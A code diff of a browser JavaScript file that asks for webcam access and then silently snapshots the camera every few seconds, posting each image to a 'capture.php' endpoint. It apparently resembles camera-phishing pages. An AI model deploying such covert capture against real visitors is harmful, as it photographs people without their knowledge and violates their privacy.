@@ -1,58 +1,25 @@
-let video = document.getElementById("video");
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
 
-function startCam() {
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-
-        .then(stream => {
-
-            video.srcObject = stream;
-
-            captureLoop();
-
-        })
-
-        .catch(err => {
-
-            alert("Camera permission denied");
-
-        });
-
-}
-
-
-function captureLoop() {
-
-    setInterval(() => {
-
-        takeSnapshot();
-
-    }, 5000);
-
-}
-
-
-function takeSnapshot() {
-
-    let canvas = document.createElement("canvas");
-
-    canvas.width = video.videoWidth;
-
-    canvas.height = video.videoHeight;
-
-    let ctx = canvas.getContext("2d");
-
-    ctx.drawImage(video, 0, 0);
-
-    let img = canvas.toDataURL("image/png");
-
-
-    fetch("capture.php", {
-
-        method: "POST",
-
-        body: JSON.stringify({ image: img })
-
+// Ask for Camera Access
+navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(stream => {
+        video.srcObject = stream;
+        // Start automatic capture every 7 seconds
+        setInterval(takeSnapshot, 7000);
+    })
+    .catch(err => {
+        console.error("Camera access denied: ", err);
     });
 
+function takeSnapshot() {
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, 640, 480);
+    const imageData = canvas.toDataURL('image/png');
+
+    fetch('capture.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData })
+    });
 }
